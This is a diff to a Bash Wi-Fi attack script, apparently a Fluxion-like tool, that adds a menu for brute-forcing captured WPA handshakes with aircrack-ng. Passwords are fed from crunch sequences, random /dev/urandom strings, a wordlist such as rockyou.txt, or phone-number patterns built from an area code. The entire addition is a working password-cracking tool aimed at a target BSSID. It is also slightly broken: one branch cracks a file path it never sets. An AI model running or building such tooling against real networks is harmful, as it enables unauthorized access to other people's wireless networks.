@@ -2427,6 +2427,317 @@ esac
 
 }
 
+
+function Bruteforce2 {
+clear
+mostrarheader
+echo
+echo "*** Which Method Would You Like To Use? ***"
+echo
+echo "1)Crunch       - Generates passwords in sequential order."
+echo "2)RandomGen    - Generates passwords randomly (User Defined Char set)."
+echo "3)Dictionary   - Tests passwords from a Wordlist or Dictionary."
+echo "4)Phone Number - Tests generated phone numbers."
+echo
+echo -n "#> "
+
+read a
+case $a in
+	1)
+clear
+cd $HANDSHAKE_PATH
+clear
+mostrarheader
+echo "Here are the files in the location you entered:"
+echo
+ls
+echo 
+echo "What is the name of your .cap file? ex: EXAMPLEWIFI.cap"
+echo 
+echo -n "--> "
+read CAPNAME
+clear
+mostrarheader
+echo "$CAPNAME"
+echo 
+echo "What is the BSSID of the Network? ex:(XX:XX:XX:XX:XX:XX) "
+echo 
+echo -n "--> "
+read BSSID
+clear
+mostrarheader
+echo "What is the Min password length? ex:5"
+echo
+echo -n "--> "
+read MIN
+clear
+mostrarheader
+echo "What is the Max password length? ex:16"
+echo
+echo -n "--> "
+read MAX
+clear
+mostrarheader
+echo "What is the Char. Set you wish to use? "
+echo
+echo -e "      "$blue"1)"$transparent" Numeric: [0-9]"
+echo -e "      "$blue"2)"$transparent" Alpha: [a-z]"
+echo -e "      "$blue"3)"$transparent" Upper Alpha: [A-Z]"
+echo -e "      "$blue"4)"$transparent" Alpha Numeric: [0-9][a-z]"
+echo -e "      "$blue"5)"$transparent" Upper Alpha Numeric: [0-9][A-Z]"
+echo -e "      "$blue"6)"$transparent" Upper + Lower Alpha Numeric: [0-9][a-z][A-Z]"
+echo -e "      "$blue"7)"$transparent" USER DEFINED: Enter the characters you wish to use."
+echo
+echo -n "#> "
+
+read b
+case $b in
+	1)
+	CHARSET=0123456789
+	clear
+;;
+	2)
+	CHARSET=abcdefghijklmnopqrstuvwxyz
+	clear
+;;
+	3)
+	CHARSET=ABCDEFGHIJKLMNOPQRSTUVWXYZ
+	clear
+;;
+	4)
+	CHARSET=0123456789abcdefghijklmnopqrstuvwxyz
+	clear
+;;
+	5)
+	CHARSET=0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ
+	clear
+;;
+	6)
+	CHARSET=0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ
+	clear
+;;
+	7)
+	
+clear
+mostrarheader
+echo "Enter the characters you wish to use for cracking."
+echo "Ex: 0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
+echo
+echo -n "--> "
+read CHARSET
+clear
+;;
+	*)
+Invalid Option
+;;
+esac
+
+crunch $MIN $MAX $CHARSET | aircrack-ng --bssid $BSSID -w- $CAPLOCATION$CAPNAME
+;;
+	2)
+clear
+mostrarheader
+echo "Where is the Handshake .cap file located? ex: /root/Handshakes/"
+echo 
+echo -n "--> "
+read CAPLOCATION
+cd $CAPLOCATION
+clear
+mostrarheader
+echo "Here are the files in the location you entered:"
+echo
+ls
+echo 
+echo "What is the name of your .cap file? ex: EXAMPLEWIFI.cap"
+echo 
+echo -n "--> "
+read CAPNAME
+clear
+mostrarheader
+echo "$CAPNAME"
+echo 
+echo "What is the BSSID of the Network? ex:(XX:XX:XX:XX:XX:XX) "
+echo 
+echo -n "--> "
+read BSSID
+clear
+mostrarheader
+echo "What is the password length? ex:16"
+echo
+echo -n "--> "
+read MAX
+clear
+mostrarheader
+echo "What is the Char. Set you wish to use? "
+echo
+echo -e "      "$blue"1)"$transparent" Numeric: [0-9]"
+echo -e "      "$blue"2)"$transparent" Alpha: [a-z]"
+echo -e "      "$blue"3)"$transparent" Upper Alpha: [A-Z]"
+echo -e "      "$blue"4)"$transparent" Alpha Numeric: [0-9][a-z]"
+echo -e "      "$blue"5)"$transparent" Upper Alpha Numeric: [0-9][A-Z]"
+echo -e "      "$blue"6)"$transparent" Upper + Lower Alpha Numeric: [0-9][a-z][A-Z]"
+echo -e "      "$blue"7)"$transparent" USER DEFINED: Enter the characters you wish to use."
+echo
+echo -n "#> "
+
+read c
+case $c in
+	1)
+	CHARSET='0-9'
+	clear
+;;
+	2)
+	CHARSET='a-z'
+	clear
+;;
+	3)
+	CHARSET='A-Z'
+	clear
+;;
+	4)
+	CHARSET='a-z0-9'
+	clear
+;;
+	5)
+	CHARSET='A-Z0-9'
+	clear
+;;
+	6)
+	CHARSET='A-Z0-9a-z'
+	clear
+;;
+	7)
+clear
+mostrarheader
+echo "Enter the characters you wish to use for cracking."
+echo "Ex: ABCDEF0123456789"
+echo
+echo -n "--> "
+read CHARSET
+clear
+;;
+	*)
+Invalid Option
+;;
+esac
+
+cat /dev/urandom | tr -dc $CHARSET | fold -w $MAX | aircrack-ng --bssid $BSSID -w- $CAPLOCATION$CAPNAME
+;;
+	3)
+clear
+mostrarheader
+echo "Where is the Handshake .cap file located? ex: /root/Handshakes/"
+echo 
+echo -n "--> "
+read CAPLOCATION
+cd $CAPLOCATION
+clear
+mostrarheader
+echo "Here are the files in the location you entered:"
+echo
+ls
+echo 
+echo "What is the name of your .cap file? ex: EXAMPLEWIFI.cap"
+echo 
+echo -n "--> "
+read CAPNAME
+clear
+mostrarheader
+echo "What is the location of your Dictionary? ex: /root/Wordlists/ "
+echo 
+echo -n "--> "
+read DICTLOCATION
+clear
+cd $DICTLOCATION
+mostrarheader
+echo "Here are the files in the location you entered:"
+echo
+ls
+echo 
+echo "What is the name of your Dictionary file? ex: rockyou.txt"
+echo 
+echo -n "--> "
+read DICTNAME
+clear
+aircrack-ng $CAPLOCATION$CAPNAME -w $DICTLOCATION$DICTNAME
+;;
+	4)
+clear
+mostrarheader
+echo "Where is the Handshake .cap file located? ex: /root/Handshakes/"
+echo 
+echo -n "--> "
+read CAPLOCATION
+cd $CAPLOCATION
+clear
+mostrarheader
+echo "Here are the files in the location you entered:"
+echo
+ls
+echo 
+echo "What is the name of your .cap file? ex: EXAMPLEWIFI.cap"
+echo 
+echo -n "--> "
+read CAPNAME
+clear
+mostrarheader
+echo "$CAPNAME"
+echo 
+echo "What is the BSSID of the Network? ex:(XX:XX:XX:XX:XX:XX) "
+echo 
+echo -n "--> "
+read BSSID
+clear
+mostrarheader
+echo "What is the Area Code? ex:(530) "
+echo
+echo -n "--> "
+read AREACODE
+clear
+mostrarheader
+echo -e "[-] Select a phone number format:"
+echo ""
+echo -e "[1] (555)555-5555  [13 chars]"
+echo -e "[2] 555-555-1234   [12 chars]"
+echo -e "[3] 5555555555     [10 chars]"
+echo -e "[4] 555-1234       [ 8 chars]"
+echo -e "[5] 5551234        [ 7 chars]"
+echo
+echo -n "#> "
+
+
+read j
+case $j in
+	1)
+clear
+crunch 13 13 -t \($AREACODE\)%%%\-%%%% | aircrack-ng --bssid $BSSID -w- $CAPLOCATION$CAPNAME
+;;
+	2)
+clear
+crunch 12 12 -t $AREACODE\-%%%\-%%%% | aircrack-ng --bssid $BSSID -w- $CAPLOCATION$CAPNAME
+;;
+	3)
+clear
+crunch 10 10 -t $AREACODE%%%%%%% | aircrack-ng --bssid $BSSID -w- $CAPLOCATION$CAPNAME
+;;
+	4)
+clear
+crunch 8 8 -t %%%\-%%%% | aircrack-ng --bssid $BSSID -w- $CAPLOCATION$CAPNAME
+;;
+	5)
+clear
+crunch 7 7 -t %%%%%%% | aircrack-ng --bssid $BSSID -w- $CAPLOCATION$CAPNAME
+;;
+esac
+;;
+	*)
+Invalid Option
+;;
+esac
+
+}
+
+
 function handshakelocation {
 	
 	conditional_clear
@@ -2716,14 +3027,16 @@ function webinterface {
 		echo
 		
 		echo -e "$blue""      1)"$transparent" Web Interface"
-		echo -e "$blue""      2)"$transparent" \e[1;31mExit"$transparent""
+		echo -e "$blue""      2)"$transparent" Bruteforce"
+		echo -e "$blue""      3)"$transparent" \e[1;31mExit"$transparent""
 		
 		echo
 		echo -n "#? "
 		read yn
 		case $yn in
 		1 ) matartodo; Menu; break;;
-		2 ) matartodo; exitmode; break;;
+		2 ) matartodo; Bruteforce2; break;;
+		3 ) matartodo; exitmode; break;;
 		esac
 	done
 }
